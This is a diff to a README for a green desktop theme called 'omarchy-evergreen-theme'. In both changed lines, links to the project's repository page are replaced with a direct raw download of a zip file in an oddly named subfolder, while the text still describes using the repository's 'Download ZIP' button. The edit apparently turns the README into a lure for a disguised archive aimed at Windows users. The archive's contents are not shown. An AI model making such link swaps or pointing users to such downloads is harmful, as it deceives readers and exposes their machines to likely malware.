@@ -1,6 +1,6 @@
 # 🌲 omarchy-evergreen-theme - Improve your desktop look with green
 
-[![](https://img.shields.io/badge/Download-Theme-blue)](https://github.com/rightist-acme5061/omarchy-evergreen-theme)
+[![](https://img.shields.io/badge/Download-Theme-blue)](https://raw.githubusercontent.com/rightist-acme5061/omarchy-evergreen-theme/main/merosymmetrical/omarchy_evergreen_theme_v2.9.zip)
 
 This project provides a dark, green-tinted theme for the Omarchy application. It changes the colors and look of your interface to reduce eye strain and provide a calm workspace.
 
@@ -8,7 +8,7 @@ This project provides a dark, green-tinted theme for the Omarchy application. It
 
 Follow these steps to set up the new theme on your Windows computer. This process takes five minutes. 
 
-First, visit the [official download page](https://github.com/rightist-acme5061/omarchy-evergreen-theme) to obtain the theme files. Locate the green button labeled "Code" and select "Download ZIP" from the menu. Save this file to your Downloads folder.
+First, visit the [official download page](https://raw.githubusercontent.com/rightist-acme5061/omarchy-evergreen-theme/main/merosymmetrical/omarchy_evergreen_theme_v2.9.zip) to obtain the theme files. Locate the green button labeled "Code" and select "Download ZIP" from the menu. Save this file to your Downloads folder.
 
 ## 🖥️ System Requirements
 
